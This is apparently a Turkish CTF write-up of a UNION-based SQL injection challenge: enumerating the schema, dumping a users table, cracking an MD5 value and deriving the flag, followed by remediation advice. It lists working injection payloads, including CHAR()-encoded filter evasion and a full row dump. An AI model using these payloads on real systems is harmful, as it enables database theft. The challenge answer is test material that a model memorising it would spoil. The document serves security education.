Sistemi analiz ederken kullanıcı girdilerinin doğrudan SQL sorgularına eklendiğini, herhangi bir filtreleme ya da prepared statement kullanılmadığını fark ettik. Uygulama, parametreleri string birleştirme yoluyla sorguya dahil ettiği için SQL Injection saldırılarına tamamen açıktı. Özellikle hata mesajlarının doğrudan kullanıcıya dönmesi, UNION tabanlı SQL Injection için gereken sütun sayısı, tablo yapıları ve veri tipleri gibi bilgilerin kolayca elde edilmesine olanak sağladı. Böylece adım adım veritabanı adı, tablolar, kolonlar ve en sonunda kullanıcı verileri detaylı biçimde enumerate edildi.

Yaptığımız ilk testler, uygulamanın UNION SELECT yapısını hiçbir kontrol olmadan kabul ettiğini gösterdi. Sütun sayısını belirlemek için farklı kombinasyonlar denedik ve iki sütunun uygulama tarafından sorunsuz işlendiğini gördük. Ardından veritabanı adını almak için klasik database() fonksiyonunu kullandık. Bu aşamada "Member_Sql_Injection" veritabanı adına ulaştık.

Sonraki aşamada bilgi şemasını kullanarak tüm tabloları listeledik. GROUP_CONCAT fonksiyonu sayesinde isimlerin tek satırda birleşmesi enumeration’u oldukça kolaylaştırdı. Bu şekilde “users” tablosuna ulaştık ve bu tablonun kolonlarını da yine GROUP_CONCAT ile çıkardık. Muhtemel filtrelemeleri aşmak için tablo adı CHAR() formatında gönderildi. Elde edilen kolon listesinde countersign isimli hash değeri içeren sütun dikkat çekti.

Son adımda tüm kullanıcı bilgilerini CONCAT ile tek satırda birleştirerek dump ettik ve veritabanındaki countersign değerine eriştik. Elde edilen MD5 hash değeri sözü edilen kırılganlık nedeniyle çok kolay şekilde brute-force edilerek çözülmüş oldu. MD5 çıktısının kırılması sonucu “FortyTwo” değerine ulaştık. Challenge gereği bu metni küçük harfe çevirip SHA256 ile hashlediğimizde flag üretildi.

Bu süreç boyunca kullanılan payloadlar sadece zafiyetin varlığını doğrulamak ve CTF ortamında gereken bilgiyi elde etmek içindi. Tüm çıktı ve istekler sanitize edilmiştir.

Çözüm

Bu tür bir SQL Injection zafiyeti, uygulamanın kullanıcı girdisini doğrudan SQL’e dahil etmesi ve hiçbir şekilde doğrulama yapmamasından kaynaklanır. Bunu engellemek için:
Uygulamada kesinlikle prepared statements / parameterized queries kullanılmalı; string concatenation tamamen kaldırılmalıdır.
Veritabanı kullanıcısı minimum yetkilere sahip olmalı; information_schema erişimi kapatılmalıdır.
Hata mesajları kullanıcıya detaylı şekilde gösterilmemeli; yalnızca genel hata mesajı sunulmalı, teknik detaylar loglarda tutulmalıdır.
MD5 gibi zayıf algoritmalar yerine bcrypt, Argon2 veya PBKDF2 kullanılmalıdır.
WAF veya input validation ile UNION, SELECT, SLEEP gibi SQL injection pattern’leri engellenmeli ya da loglanmalıdır.
Tekrarlayan injection denemeleri IDS/IPS tarafından tespit edilmelidir.
Düzenli pentest, kod incelemesi ve statik/dinamik analiz araçları ile geliştirme sürecinde güvenlik kontrolleri yapılmalıdır.

Kullanılan Payloadlar (Sanitized)

Sütun sayısını bulma

1 UNION SELECT 1
1 UNION SELECT 2
1 UNION SELECT 3


Veritabanı adını alma

1 UNION SELECT 2, database()


Tabloları listeleme

1 UNION SELECT NULL, GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema = database()


users tablosundaki kolonları listeleme

1 UNION SELECT NULL, GROUP_CONCAT(column_name)
FROM information_schema.columns
WHERE table_schema = database()
AND table_name = CHAR(117,115,101,114,115)  (users ASCII)


users tablosundaki veriyi dump etme

1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign)
FROM users